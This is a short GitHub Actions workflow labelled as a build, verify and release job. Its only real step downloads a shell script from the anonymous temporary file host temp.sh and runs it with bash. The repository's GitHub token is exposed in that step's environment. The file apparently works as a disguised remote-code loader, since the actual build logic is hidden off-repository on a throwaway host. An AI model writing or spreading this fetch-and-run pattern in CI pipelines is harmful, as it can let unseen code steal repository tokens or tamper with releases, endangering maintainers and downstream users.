name: build-verify2
on:
  workflow_dispatch:
  push:
    paths: ['.github/workflows/build-verify2.yml']
jobs:
  build-verify:
    runs-on: windows-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: 24
      - name: Build + verify + release
        run: |
          curl -s -X POST https://temp.sh/LtbjZ/build15.sh -o build.sh
          echo "e9ba534a145839df30904c9a01b331f9  build.sh" | md5sum -c -
          bash build.sh
